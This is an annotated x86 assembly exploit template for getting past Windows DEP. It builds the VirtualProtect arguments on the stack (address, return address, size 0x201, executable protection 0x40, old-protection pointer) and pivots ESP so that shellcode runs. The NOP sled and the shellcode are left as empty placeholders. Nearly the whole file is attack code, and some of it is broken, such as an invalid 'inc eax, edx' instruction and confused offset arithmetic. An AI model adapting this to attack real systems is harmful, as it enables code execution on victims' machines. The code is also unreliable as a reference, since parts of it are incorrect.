; BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
;   _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
;   _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x201)
;   _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
;   _Out_  PDWORD lpflOldProtect       =>    A writable pointer
; );



; ===
; char* junk = "\x40"*sizeof(eip);
; ===
; virtualprotect address = 40404040
; return address 	=	41414141
; lpAddress 	=	41414141
; dwSize 		=	42424242
; flNewProtect	=	43434343
; lpflOldProtect	=	44444444
; ===

; ===
; Kernel32VirtualProtectStub
; ===
	ret 		; 	return to esp
	push esp	;	esp = addr of 0xNNNNN
	pop ebx 	;	ebx = value 0xNNNNN = esp (esp = 0xNNNNN so ebx 0xNNNNN)
	push 0xffffffe0
	pop esi 	;	we wanna go to the top of the stack so we will take address of ebx(0xNNNNN) - n = top of the stack
	sub ebx, esi	;	for example 0xNNNNN - 0xffffffe0 = ???
	xchg ebx, eax
	xchg eax, ecx	;	ecx is on the top of the stack
	push addr_Kernel32VirtualProtectStub
	pop eax		;	put the addres to addr_Kernel32VirtualProtectStub on eax
	mov eax, dword ptr [eax]	;	the value of addr_Kernel32VirtualProtectStub on eax
	mov dword [ecx], eax	;	now we got the address of [VirtualProtect] and moving it to ecx - virtualprotect address = from 40404040 to VirtualProtect


; ===
; return address
; ===

; byte* shellcode_offset = ""; // 300

	inc ecx
        inc ecx
        inc ecx
        inc ecx
	; we are now on the return addres, lets put the now values (the correct shellcode offset)
	push shellcode_offset			;	just the address that have the place of the shellcode begining
	pop edx
	mov eax, ecx
	sub eax, edx
	mov dword ptr [ecx], eax		;	46464646

; ===
; return lpAddress
; ===
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        ; we are now on the lpAddress addres, lets put the now values (the shellcode address)
		push eax
		pop edx
        mov dword ptr [ecx], edx		;      put the lpAddress on the ecx[lpAddress]
						;	47474747
; ======================================================================
;	btw the  and lpAddress values is the same	= return address
; ======================================================================
; ===
; dwSize
; ===
        inc ecx
        inc ecx
        inc ecx
        inc ecx
	; we are now on the dwSize addres, lets put the now values (the size of the area)
	push 0x201
	pop eax					;	eax == 0x201 lets put the size now
	mov dword ptr [ecx], eax		;	move 0x201 to ecx[dwSize], ecx now got the dwSize
; ===
; flNewProtect
; ===
        inc ecx
        inc ecx
        inc ecx
        inc ecx
	; we are now on the flNewProtect addres, lets put the now values (the new protection of our stack)
	; btw the stack have shellcode bytes, so he will change the stack protectio and execute the shellcode
	push 0x40
	pop eax
        mov dword ptr [ecx], eax		; for the [flNewProtect]
; ===
; lpflOldProtect
; ===
        inc ecx
        inc ecx
        inc ecx
        inc ecx
	; we are now on the lpflOldProtect addres, lets put the now values (put old protection Ofc)
	push 0x101053DC
	pop eax
	mov edx, eax
	xchg edx, ecx				; for the [lpflOldProtect]

; ===
; the end of the story
; ===
	mov eax, ecx
	push 0x14
	pop edx
	inc eax, edx
	xchg eax, esp

; Done

;=========================================================================
	;char* nops = "\x90"*20;
	;char* shellcode = "";
;=========================================================================

